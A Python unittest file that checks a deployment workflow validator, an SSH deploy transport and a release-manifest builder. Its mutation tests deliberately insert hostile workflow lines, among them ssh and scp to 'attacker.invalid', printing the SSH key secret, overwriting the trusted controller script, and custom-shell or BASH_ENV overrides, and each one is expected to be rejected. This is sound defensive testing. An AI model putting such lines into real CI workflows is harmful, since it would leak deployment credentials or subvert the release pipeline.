from __future__ import annotations

import contextlib
import hashlib
import io
import json
import os
from pathlib import Path
import shutil
import subprocess
import tempfile
import unittest
from unittest import mock

from tools.check_public_repo import (
    Entry,
    _content_errors,
    _deployment_workflow_errors,
    _path_errors,
)
from tools.deploy_ssh_transport import (
    DeployInputError,
    DeployInputs,
    PreparedSsh,
    SCP_PATH,
    SSH_PATH,
    _subprocess_environment,
    _known_host_match_is_exact,
    deploy_release,
    load_deploy_inputs,
    normalize_deploy_host,
    normalize_deploy_known_hosts,
    normalize_deploy_port_input,
    normalize_deploy_private_key,
    normalize_deploy_user,
    prepare_ssh_inputs,
    _known_host_queries,
)
from tools.release_manifest import build_manifest, verify_manifest, verify_manifest_identity
from tools.validate_deploy_port import main as validate_deploy_port_main
from tools.validate_deploy_port import normalize_deploy_port


class PublicScannerTest(unittest.TestCase):
    def test_environment_examples_are_exact(self) -> None:
        self.assertNotIn("environment_file_not_allowed", _path_errors(Entry("web/.env.example", b"X=\n")))
        self.assertIn("environment_file_not_allowed", _path_errors(Entry("web/local.env.example", b"X=\n")))

    def test_high_confidence_secret_is_rejected_without_echo(self) -> None:
        value = b"client_" + b'secret="' + b"abcdefghijklmnopqrstuvwx" + b'"\n'
        self.assertIn("credential_pattern_not_allowed", _content_errors(Entry("config.txt", value)))
        placeholder = b'client_secret="placeholder"\n'
        self.assertNotIn("credential_pattern_not_allowed", _content_errors(Entry("config.txt", placeholder)))

    def test_raw_provider_json_is_rejected_but_terms_in_code_are_allowed(self) -> None:
        raw = json.dumps({"raw_response": {"content": "redacted"}}).encode()
        self.assertIn("raw_provider_or_execution_json_not_allowed", _content_errors(Entry("x.json", raw)))
        code = b'field = "provider_response"\n'
        self.assertNotIn("raw_provider_or_execution_json_not_allowed", _content_errors(Entry("x.py", code)))

    def test_unapproved_binary_and_symlink_are_rejected(self) -> None:
        self.assertIn("unapproved_binary_file", _content_errors(Entry("data/blob.bin", b"\x00\xff")))
        self.assertIn("symlink_or_submodule_not_allowed", _path_errors(Entry("x", b"target", "120000")))

    def test_production_deploy_requires_trusted_unified_ssh_preflight(self) -> None:
        workflow = """
run-name: "production approval for ci-release #${{ github.event.workflow_run.id || inputs.publish_run_id }}"
on:
  workflow_run:
    workflows: ["ci-release"]
    types: [completed]
    branches: [main]
  workflow_dispatch:
    inputs:
      publish_run_id:
        required: true
        type: string
concurrency:
  group: traceable-support-production
  cancel-in-progress: false
jobs:
  deploy:
    if: >-
      github.event_name == 'workflow_dispatch' ||
      (
        github.event_name == 'workflow_run' &&
        github.event.workflow_run.conclusion == 'success' &&
        github.event.workflow_run.event == 'push' &&
        github.event.workflow_run.head_branch == 'main' &&
        github.event.workflow_run.head_repository.full_name == github.repository
      )
    environment: production
    env:
      PUBLISH_RUN_ID: ${{ github.event.workflow_run.id || inputs.publish_run_id }}
      PUBLISH_HEAD_SHA: ${{ github.event.workflow_run.head_sha || '' }}
      PUBLISH_RUN_ATTEMPT: ${{ github.event.workflow_run.run_attempt || '' }}
    steps:
      - name: Check out the trusted deployment controller
        uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803
        with:
          ref: main
          persist-credentials: false
      - name: Set up Python
        run: python --version
      - name: Stage trusted deployment controller
        run: |
          set -Eeuo pipefail
          controller_dir="$RUNNER_TEMP/traceable-deploy-controller"
          install -d -m 700 "$controller_dir"
          install -m 600 tools/validate_deploy_port.py "$controller_dir/validate_deploy_port.py"
          install -m 600 tools/deploy_ssh_transport.py "$controller_dir/deploy_ssh_transport.py"
      - name: Download manifest from the selected green run
        uses: actions/download-artifact@0000000000000000000000000000000000000000
        with:
          run-id: ${{ env.PUBLISH_RUN_ID }}
      - name: Bind manifest to the selected green run
        run: |
          verify_args=(
            --github-run-id "$PUBLISH_RUN_ID"
          )
          if [[ -n "$PUBLISH_HEAD_SHA" ]]; then
            verify_args+=(--git-sha "$PUBLISH_HEAD_SHA")
          fi
          if [[ -n "$PUBLISH_RUN_ATTEMPT" ]]; then
            verify_args+=(--github-run-attempt "$PUBLISH_RUN_ATTEMPT")
          fi
      - name: Check out the manifest commit
        uses: actions/checkout@0000000000000000000000000000000000000000
      - name: Verify manifest and main ancestry
        run: python --version
      - name: Build public deployment package
        run: python --version
      - name: Verify trusted deployment controller integrity
        run: |
          set -Eeuo pipefail
          controller_dir="$RUNNER_TEMP/traceable-deploy-controller"
          printf '%s  %s\\n' \\
            '6a1af83611a5164e53a8697fe654725a867fe8bc8a8e1b81af01d34cc2b70e52' "$controller_dir/validate_deploy_port.py" \\
            '04672e995d5283ffc10fa3d069cf1510f7180e74f6296bfb21584e7586bd0203' "$controller_dir/deploy_ssh_transport.py" \\
            | /usr/bin/sha256sum --check --strict
      - name: Upload and activate with strict host verification
        env:
          DEPLOY_HOST: ${{ secrets.DEPLOY_HOST }}
          DEPLOY_USER: ${{ secrets.DEPLOY_USER }}
          DEPLOY_PORT: ${{ secrets.DEPLOY_PORT }}
          DEPLOY_SSH_KEY: ${{ secrets.DEPLOY_SSH_KEY }}
          DEPLOY_KNOWN_HOSTS: ${{ secrets.DEPLOY_KNOWN_HOSTS }}
          BASH_ENV: /dev/null
          LD_LIBRARY_PATH: ""
          LD_PRELOAD: ""
        run: |
          set -Eeuo pipefail
          /usr/bin/python3 -E "$RUNNER_TEMP/traceable-deploy-controller/deploy_ssh_transport.py" \\
            --staging release-staging \\
            --remote-stage "/tmp/traceable-support-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}" \\
            --release-root /opt/traceable-support
"""
        self.assertEqual(_deployment_workflow_errors(workflow), [])

        required_errors = {
            'run-name: "production approval for ci-release #${{ github.event.workflow_run.id || inputs.publish_run_id }}"': (
                "production_deploy_run_name_missing"
            ),
            "workflow_dispatch:": "production_deploy_manual_fallback_missing",
            "required: true": "production_deploy_manual_input_invalid",
            "workflow_run:": "production_deploy_auto_queue_missing",
            'workflows: ["ci-release"]': "production_deploy_source_workflow_invalid",
            "types: [completed]": "production_deploy_completion_trigger_missing",
            "branches: [main]": "production_deploy_branch_filter_missing",
            "github.event_name == 'workflow_run'": "production_deploy_condition_invalid",
            "github.event.workflow_run.conclusion == 'success'": (
                "production_deploy_condition_invalid"
            ),
            "github.event.workflow_run.event == 'push'": "production_deploy_condition_invalid",
            "github.event.workflow_run.head_branch == 'main'": (
                "production_deploy_condition_invalid"
            ),
            "github.event.workflow_run.head_repository.full_name == github.repository": (
                "production_deploy_condition_invalid"
            ),
            "environment: production": "production_deploy_environment_gate_missing",
            "PUBLISH_RUN_ID: ${{ github.event.workflow_run.id || inputs.publish_run_id }}": (
                "production_deploy_run_identity_missing"
            ),
            "PUBLISH_HEAD_SHA: ${{ github.event.workflow_run.head_sha || '' }}": (
                "production_deploy_head_identity_missing"
            ),
            "PUBLISH_RUN_ATTEMPT: ${{ github.event.workflow_run.run_attempt || '' }}": (
                "production_deploy_attempt_identity_missing"
            ),
            "run-id: ${{ env.PUBLISH_RUN_ID }}": "production_deploy_artifact_identity_missing",
            '--github-run-id "$PUBLISH_RUN_ID"': (
                "production_deploy_manifest_run_binding_missing"
            ),
            'verify_args+=(--git-sha "$PUBLISH_HEAD_SHA")': (
                "production_deploy_manifest_sha_binding_missing"
            ),
            'verify_args+=(--github-run-attempt "$PUBLISH_RUN_ATTEMPT")': (
                "production_deploy_manifest_attempt_binding_missing"
            ),
            "- name: Check out the trusted deployment controller": (
                "production_deploy_controller_not_trusted"
            ),
            "uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803": (
                "production_deploy_controller_not_trusted"
            ),
            "ref: main": "production_deploy_controller_not_trusted",
            "persist-credentials: false": "production_deploy_controller_not_trusted",
            "- name: Stage trusted deployment controller": (
                "production_deploy_controller_not_trusted"
            ),
            "- name: Check out the manifest commit": (
                "production_deploy_controller_not_trusted"
            ),
            (
                'install -m 600 tools/validate_deploy_port.py '
                '"$controller_dir/validate_deploy_port.py"'
            ): "production_deploy_controller_not_trusted",
            (
                'install -m 600 tools/deploy_ssh_transport.py '
                '"$controller_dir/deploy_ssh_transport.py"'
            ): "production_deploy_controller_not_trusted",
            (
                '/usr/bin/python3 -E "$RUNNER_TEMP/traceable-deploy-controller/'
                'deploy_ssh_transport.py" \\'
            ): "production_deploy_transport_preflight_invalid",
            "04672e995d5283ffc10fa3d069cf1510f7180e74f6296bfb21584e7586bd0203": (
                "production_deploy_controller_integrity_missing"
            ),
            "DEPLOY_HOST: ${{ secrets.DEPLOY_HOST }}": (
                "production_deploy_transport_preflight_invalid"
            ),
            "group: traceable-support-production": "production_deploy_concurrency_missing",
            "cancel-in-progress: false": "production_deploy_must_not_cancel_in_progress",
        }
        for required, error in required_errors.items():
            with self.subTest(required=required):
                self.assertIn(error, _deployment_workflow_errors(workflow.replace(required, "")))

        comment_only = workflow.replace(
            "  workflow_run:",
            "  # workflow_run:",
        ).replace(
            "    if: >-",
            "    if: github.event_name == 'workflow_dispatch'\n    # if: >-",
        )
        self.assertIn(
            "production_deploy_auto_queue_missing",
            _deployment_workflow_errors(comment_only),
        )
        self.assertIn(
            "production_deploy_condition_invalid",
            _deployment_workflow_errors(comment_only),
        )

        for direct_use in (
            '          command ssh "$DEPLOY_USER@$DEPLOY_HOST" true\n',
            "          timeout 10 ssh attacker.invalid true\n",
            "          env TEST_ONLY=1 scp source attacker.invalid:/tmp/\n",
            '          printf "%s" "$DEPLOY_SSH_KEY"\n',
            '          printf "%s" "$DEPLOY_HOST" # ${{ secrets.DEPLOY_HOST }}\n',
            "          python unexpected.py\n",
        ):
            with self.subTest(direct_use=direct_use):
                mutation = workflow.replace(
                    '          /usr/bin/python3 -E "$RUNNER_TEMP/traceable-deploy-controller',
                    direct_use
                    + '          /usr/bin/python3 -E "$RUNNER_TEMP/traceable-deploy-controller',
                )
                self.assertIn(
                    "production_deploy_transport_preflight_invalid",
                    _deployment_workflow_errors(mutation),
                )
        unsafe_guard = workflow.replace(
            '          /usr/bin/python3 -E "$RUNNER_TEMP/traceable-deploy-controller',
            '          [[ "$port" =~ ^[0-9]{1,5}$ ]] && test "$port"\n'
            '          /usr/bin/python3 -E "$RUNNER_TEMP/traceable-deploy-controller',
        )
        self.assertIn(
            "production_deploy_transport_preflight_invalid",
            _deployment_workflow_errors(unsafe_guard),
        )

        invocation = (
            '          /usr/bin/python3 -E "$RUNNER_TEMP/traceable-deploy-controller/'
            'deploy_ssh_transport.py" \\'
        )
        duplicate = workflow.replace(invocation, invocation + "\n" + invocation)
        self.assertIn(
            "production_deploy_transport_preflight_invalid",
            _deployment_workflow_errors(duplicate),
        )

        untrusted_controller = workflow.replace("          ref: main", "          ref: feature")
        self.assertIn(
            "production_deploy_controller_not_trusted",
            _deployment_workflow_errors(untrusted_controller),
        )
        foreign_controller = workflow.replace(
            "        with:\n          ref: main",
            "        with:\n          repository: other/repository\n          ref: main",
            1,
        )
        self.assertIn(
            "production_deploy_controller_not_trusted",
            _deployment_workflow_errors(foreign_controller),
        )
        stage_block = """      - name: Stage trusted deployment controller
        run: |
          set -Eeuo pipefail
          controller_dir="$RUNNER_TEMP/traceable-deploy-controller"
          install -d -m 700 "$controller_dir"
          install -m 600 tools/validate_deploy_port.py "$controller_dir/validate_deploy_port.py"
          install -m 600 tools/deploy_ssh_transport.py "$controller_dir/deploy_ssh_transport.py"
"""
        manifest_block = """      - name: Check out the manifest commit
        uses: actions/checkout@0000000000000000000000000000000000000000
"""
        stage_after_manifest = workflow.replace(stage_block, "").replace(
            manifest_block,
            manifest_block + stage_block,
        )
        self.assertIn(
            "production_deploy_controller_not_trusted",
            _deployment_workflow_errors(stage_after_manifest),
        )
        overwritten_controller = workflow.replace(
            (
                '          install -m 600 tools/deploy_ssh_transport.py '
                '"$controller_dir/deploy_ssh_transport.py"\n'
            ),
            (
                '          install -m 600 tools/deploy_ssh_transport.py '
                '"$controller_dir/deploy_ssh_transport.py"\n'
                '          python -c "from pathlib import Path; '
                "Path('$controller_dir/deploy_ssh_transport.py').write_text('print(1)')\"\n"
            ),
        )
        self.assertIn(
            "production_deploy_controller_not_trusted",
            _deployment_workflow_errors(overwritten_controller),
        )
        extra_step = workflow.replace(
            stage_block,
            stage_block
            + "      - name: Unexpected intermediate command\n"
            + "        run: python --version\n",
        )
        self.assertIn(
            "production_deploy_controller_not_trusted",
            _deployment_workflow_errors(extra_step),
        )
        shell_override = workflow.replace(
            "      - name: Upload and activate with strict host verification\n",
            "      - name: Upload and activate with strict host verification\n"
            "        shell: /tmp/custom-shell {0}\n",
        )
        self.assertIn(
            "production_deploy_controller_not_trusted",
            _deployment_workflow_errors(shell_override),
        )
        quoted_shell_override = workflow.replace(
            "      - name: Upload and activate with strict host verification\n",
            "      - name: Upload and activate with strict host verification\n"
            "        'shell': '/tmp/custom-shell {0}'\n",
        )
        self.assertIn(
            "production_deploy_controller_not_trusted",
            _deployment_workflow_errors(quoted_shell_override),
        )
        ignored_integrity_failure = workflow.replace(
            "      - name: Verify trusted deployment controller integrity\n",
            "      - name: Verify trusted deployment controller integrity\n"
            "        continue-on-error: true\n",
        )
        self.assertIn(
            "production_deploy_controller_integrity_missing",
            _deployment_workflow_errors(ignored_integrity_failure),
        )
        unconditional_upload = workflow.replace(
            "      - name: Upload and activate with strict host verification\n",
            "      - name: Upload and activate with strict host verification\n"
            "        if: always()\n",
        )
        self.assertIn(
            "production_deploy_transport_preflight_invalid",
            _deployment_workflow_errors(unconditional_upload),
        )
        top_level_shell_override = workflow.replace(
            "jobs:\n",
            "defaults:\n"
            "  run:\n"
            "    shell: /tmp/custom-shell {0}\n"
            "jobs:\n",
        )
        self.assertIn(
            "production_deploy_controller_not_trusted",
            _deployment_workflow_errors(top_level_shell_override),
        )
        flow_style_defaults = workflow.replace(
            "jobs:\n",
            "defaults: {run: {shell: 'bash -e {0}'}}\n"
            "jobs:\n",
        )
        self.assertIn(
            "production_deploy_controller_not_trusted",
            _deployment_workflow_errors(flow_style_defaults),
        )
        extra_job_environment = workflow.replace(
            "      PUBLISH_RUN_ATTEMPT: ${{ github.event.workflow_run.run_attempt || '' }}\n",
            "      PUBLISH_RUN_ATTEMPT: ${{ github.event.workflow_run.run_attempt || '' }}\n"
            "      BASH_ENV: /tmp/custom-env\n",
        )
        self.assertIn(
            "production_deploy_environment_invalid",
            _deployment_workflow_errors(extra_job_environment),
        )
        extra_upload_environment = workflow.replace(
            "          DEPLOY_KNOWN_HOSTS: ${{ secrets.DEPLOY_KNOWN_HOSTS }}\n",
            "          DEPLOY_KNOWN_HOSTS: ${{ secrets.DEPLOY_KNOWN_HOSTS }}\n"
            "          BASH_ENV: /tmp/custom-env\n",
        )
        self.assertIn(
            "production_deploy_transport_preflight_invalid",
            _deployment_workflow_errors(extra_upload_environment),
        )
        secret_in_build_step = workflow.replace(
            "      - name: Build public deployment package\n"
            "        run: python --version\n",
            "      - name: Build public deployment package\n"
            "        env:\n"
            "          SECRET_ALIAS: ${{ secrets.DEPLOY_HOST }}\n"
            "        run: python --version\n",
        )
        self.assertIn(
            "production_deploy_transport_preflight_invalid",
            _deployment_workflow_errors(secret_in_build_step),
        )

    def test_trusted_controller_hashes_match_worktree_bytes(self) -> None:
        root = Path(__file__).resolve().parents[2]
        workflow = (root / ".github/workflows/deploy-production.yml").read_text(
            encoding="utf-8"
        )
        for relative in (
            "tools/validate_deploy_port.py",
            "tools/deploy_ssh_transport.py",
        ):
            digest = hashlib.sha256((root / relative).read_bytes()).hexdigest()
            with self.subTest(relative=relative):
                self.assertIn(digest, workflow)


class DeployPortValidationTest(unittest.TestCase):
    def test_port_is_ascii_decimal_in_range_and_canonicalized(self) -> None:
        for value, expected in (
            ("1", "1"),
            ("22", "22"),
            ("00022", "22"),
            ("65535", "65535"),
        ):
            with self.subTest(value=value):
                self.assertEqual(normalize_deploy_port(value), expected)

        for value in (
            "",
            "0",
            "65536",
            "22\n",
            "22\r\n",
            " 22",
            "22 ",
            '"22"',
            "+22",
            "22/tcp",
            "２２",
        ):
            with self.subTest(value=repr(value)):
                with self.assertRaisesRegex(ValueError, "^deploy_port_invalid$"):
                    normalize_deploy_port(value)

    def test_cli_fails_closed_without_echoing_invalid_value(self) -> None:
        stdout = io.StringIO()
        stderr = io.StringIO()
        with contextlib.redirect_stdout(stdout), contextlib.redirect_stderr(stderr):
            exit_code = validate_deploy_port_main(["22\n"])
        self.assertEqual(exit_code, 64)
        self.assertEqual(stdout.getvalue(), "")
        self.assertEqual(stderr.getvalue(), "deploy_port_invalid\n")


class DeploySshTransportTest(unittest.TestCase):
    def test_scalar_inputs_remove_one_bom_and_fail_closed(self) -> None:
        self.assertEqual(normalize_deploy_host("\ufeff47.84.34.86"), "47.84.34.86")
        self.assertEqual(normalize_deploy_host("\ufeffdeploy.example.test"), "deploy.example.test")
        self.assertEqual(normalize_deploy_user("\ufeffdeployer"), "deployer")
        self.assertEqual(normalize_deploy_port_input("\ufeff00022"), "22")

        invalid_cases = (
            (normalize_deploy_host, "\ufeff\ufeff47.84.34.86", "deploy_host_invalid"),
            (normalize_deploy_host, "47.84.34.86\n", "deploy_host_invalid"),
            (normalize_deploy_host, "::1", "deploy_host_invalid"),
            (normalize_deploy_user, "root", "deploy_user_invalid"),
            (normalize_deploy_user, "deploy user", "deploy_user_invalid"),
            (normalize_deploy_port_input, "22\r\n", "deploy_port_invalid"),
        )
        for normalizer, value, error in invalid_cases:
            with self.subTest(value=repr(value)):
                with self.assertRaisesRegex(DeployInputError, f"^{error}$"):
                    normalizer(value)

    def test_multiline_inputs_remove_bom_and_normalize_newlines(self) -> None:
        private_key = "\ufeff-----BEGIN OPENSSH PRIVATE KEY-----\r\nabc\r\n-----END OPENSSH PRIVATE KEY-----"
        known_hosts = "\ufeffexample.test ssh-ed25519 AAAA\r\n"
        self.assertEqual(
            normalize_deploy_private_key(private_key),
            "-----BEGIN OPENSSH PRIVATE KEY-----\nabc\n-----END OPENSSH PRIVATE KEY-----\n",
        )
        self.assertEqual(
            normalize_deploy_known_hosts(known_hosts),
            "example.test ssh-ed25519 AAAA\n",
        )

    def test_missing_port_defaults_to_22(self) -> None:
        environment = {
            "DEPLOY_HOST": "deploy.example.test",
            "DEPLOY_USER": "deployer",
            "DEPLOY_PORT": "",
            "DEPLOY_SSH_KEY": "-----BEGIN OPENSSH PRIVATE KEY-----\nabc\n",
            "DEPLOY_KNOWN_HOSTS": "deploy.example.test ssh-ed25519 AAAA\n",
        }
        self.assertEqual(load_deploy_inputs(environment).port, "22")
        self.assertEqual(_known_host_queries("deploy.example.test", "22"), ("deploy.example.test",))
        self.assertEqual(
            _known_host_queries("deploy.example.test", "2222"),
            ("[deploy.example.test]:2222",),
        )

    def test_known_host_match_rejects_wildcards_and_accepts_exact_or_hashed(self) -> None:
        query = "deploy.example.test"
        key = "ssh-ed25519 AAAA"
        self.assertTrue(
            _known_host_match_is_exact(
                f"# Host {query} found: line 1\n{query} {key}\n".encode(),
                query,
            )
        )
        self.assertTrue(
            _known_host_match_is_exact(
                f"|1|synthetic-hash|synthetic-value {key}\n".encode(),
                query,
            )
        )
        self.assertFalse(
            _known_host_match_is_exact(f"*.example.test {key}\n".encode(), query)
        )
        self.assertFalse(
            _known_host_match_is_exact(f"!{query},* {key}\n".encode(), query)
        )
        self.assertFalse(
            _known_host_match_is_exact(f"{query},*.example.test {key}\n".encode(), query)
        )
        self.assertFalse(
            _known_host_match_is_exact(f"@revoked {query} {key}\n".encode(), query)
        )

    def test_child_processes_do_not_inherit_deploy_secrets_or_ssh_agent(self) -> None:
        environment = {
            "DEPLOY_HOST": "secret-host",
            "DEPLOY_USER": "secret-user",
            "DEPLOY_PORT": "22",
            "DEPLOY_SSH_KEY": "secret-key",
            "DEPLOY_KNOWN_HOSTS": "secret-known-hosts",
            "SSH_AUTH_SOCK": "secret-agent",
            "PATH": "safe-path",
        }
        with mock.patch.dict(os.environ, environment, clear=True):
            child_environment = _subprocess_environment()
        self.assertEqual(child_environment, {"PATH": "safe-path"})

    @unittest.skipIf(os.name == "nt", "Windows OpenSSH requires ACL setup outside chmod")
    @unittest.skipUnless(shutil.which("ssh-keygen"), "ssh-keygen is required")
    def test_synthetic_key_and_known_host_pass_local_preflight(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            key_path = Path(temporary) / "synthetic"
            subprocess.run(
                (
                    "ssh-keygen",
                    "-q",
                    "-t",
                    "ed25519",
                    "-N",
                    "",
                    "-C",
                    "synthetic-test-only",
                    "-f",
                    str(key_path),
                ),
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            public_parts = key_path.with_suffix(".pub").read_text(encoding="utf-8").split()
            environment = {
                "DEPLOY_HOST": "\ufeffdeploy.example.test",
                "DEPLOY_USER": "\ufeffdeployer",
                "DEPLOY_PORT": "\ufeff22",
                "DEPLOY_SSH_KEY": "\ufeff"
                + key_path.read_text(encoding="utf-8").replace("\n", "\r\n"),
                "DEPLOY_KNOWN_HOSTS": (
                    "\ufeffdeploy.example.test "
                    + " ".join(public_parts[:2])
                    + "\r\n"
                ),
            }
            inputs = load_deploy_inputs(environment)
            with prepare_ssh_inputs(inputs) as prepared:
                self.assertTrue(prepared.key_file.is_file())
                self.assertTrue(prepared.known_hosts_file.is_file())

    def test_transport_commands_are_centralized_and_argument_safe(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            staging = Path(temporary) / "staging"
            staging.mkdir()
            prepared = PreparedSsh(
                inputs=DeployInputs(
                    host="deploy.example.test",
                    user="deployer",
                    port="22",
                    private_key="unused",
                    known_hosts="unused",
                ),
                key_file=Path(temporary) / "key",
                known_hosts_file=Path(temporary) / "known-hosts",
            )
            with mock.patch("tools.deploy_ssh_transport._run_transport") as run_transport:
                deploy_release(
                    prepared,
                    staging,
                    "/tmp/traceable-support-123-1",
                    "/opt/traceable-support",
                )
            self.assertEqual(run_transport.call_count, 3)
            commands = [call.args[0] for call in run_transport.call_args_list]
            common_options = (
                "-F",
                "/dev/null",
                "-i",
                str(prepared.key_file),
                "-o",
                "BatchMode=yes",
                "-o",
                "ConnectionAttempts=1",
                "-o",
                "ConnectTimeout=15",
                "-o",
                "IdentitiesOnly=yes",
                "-o",
                "GlobalKnownHostsFile=/dev/null",
                "-o",
                "StrictHostKeyChecking=yes",
                "-o",
                f"UserKnownHostsFile={prepared.known_hosts_file}",
            )
            remote_stage = "/tmp/traceable-support-123-1"
            destination = "deployer@deploy.example.test"
            self.assertEqual(
                commands,
                [
                    (
                        SSH_PATH,
                        *common_options,
                        "-p",
                        "22",
                        destination,
                        f"mkdir -m 700 {remote_stage}",
                    ),
                    (
                        SCP_PATH,
                        "-r",
                        *common_options,
                        "-P",
                        "22",
                        str(staging.resolve()) + "/.",
                        f"{destination}:{remote_stage}/",
                    ),
                    (
                        SSH_PATH,
                        *common_options,
                        "-p",
                        "22",
                        destination,
                        (
                            f"python3 {remote_stage}/deploy/install_release.py "
                            f"--staging {remote_stage} "
                            "--release-root /opt/traceable-support"
                        ),
                    ),
                ],
            )
            self.assertEqual(
                [call.args[1] for call in run_transport.call_args_list],
                ["prepare_remote", "upload", "activate"],
            )

    def test_invalid_secret_returns_stable_code_without_echo(self) -> None:
        secret_value = "unique invalid host value"
        environment = {
            "DEPLOY_HOST": secret_value,
            "DEPLOY_USER": "deployer",
            "DEPLOY_PORT": "22",
            "DEPLOY_SSH_KEY": "not-a-key",
            "DEPLOY_KNOWN_HOSTS": "not-known-hosts",
        }
        from tools.deploy_ssh_transport import main as deploy_ssh_transport_main

        stderr = io.StringIO()
        with mock.patch.dict(os.environ, environment, clear=True), contextlib.redirect_stderr(stderr):
            exit_code = deploy_ssh_transport_main(
                (
                    "--staging",
                    "missing",
                    "--remote-stage",
                    "/tmp/traceable-support-123-1",
                    "--release-root",
                    "/opt/traceable-support",
                )
            )
        self.assertEqual(exit_code, 64)
        self.assertEqual(stderr.getvalue(), "deploy_host_invalid\n")
        self.assertNotIn(secret_value, stderr.getvalue())


class ReleaseManifestTest(unittest.TestCase):
    def test_manifest_is_replay_only_and_digest_bound(self) -> None:
        manifest = build_manifest(
            git_sha="a" * 40,
            web_image="ghcr.io/suuny-ab/traceable-support-agent-web@sha256:" + "b" * 64,
            api_image="ghcr.io/suuny-ab/traceable-support-agent-api-replay@sha256:" + "c" * 64,
            built_at="2026-07-23T00:00:00Z",
            github_run_id="1",
            github_run_attempt=1,
        )
        self.assertFalse(manifest["runtime"]["provider_enabled"])
        self.assertEqual(manifest["runtime"]["prompt"]["status"], "not_applicable")
        self.assertEqual(verify_manifest(manifest), manifest)
        self.assertEqual(
            verify_manifest_identity(
                manifest,
                expected_run_id="1",
                expected_git_sha="a" * 40,
                expected_run_attempt=1,
            ),
            manifest,
        )

    def test_deployment_identity_rejects_mismatched_run_sha_or_attempt(self) -> None:
        manifest = build_manifest(
            git_sha="a" * 40,
            web_image="ghcr.io/suuny-ab/traceable-support-agent-web@sha256:" + "b" * 64,
            api_image="ghcr.io/suuny-ab/traceable-support-agent-api-replay@sha256:" + "c" * 64,
            built_at="2026-07-23T00:00:00Z",
            github_run_id="10",
            github_run_attempt=2,
        )
        cases = (
            ({"expected_run_id": "11"}, "release_manifest_run_id_mismatch"),
            (
                {"expected_run_id": "10", "expected_git_sha": "d" * 40},
                "release_manifest_git_sha_mismatch",
            ),
            (
                {"expected_run_id": "10", "expected_run_attempt": 1},
                "release_manifest_attempt_mismatch",
            ),
        )
        for arguments, error in cases:
            with self.subTest(error=error):
                with self.assertRaisesRegex(ValueError, error):
                    verify_manifest_identity(manifest, **arguments)

    def test_moving_tag_is_rejected(self) -> None:
        with self.assertRaisesRegex(ValueError, "web_image_invalid"):
            build_manifest(
                git_sha="a" * 40,
                web_image="ghcr.io/suuny-ab/traceable-support-agent-web:latest",
                api_image="ghcr.io/suuny-ab/traceable-support-agent-api-replay@sha256:" + "c" * 64,
                built_at="2026-07-23T00:00:00Z",
                github_run_id="1",
                github_run_attempt=1,
            )


if __name__ == "__main__":
    unittest.main()
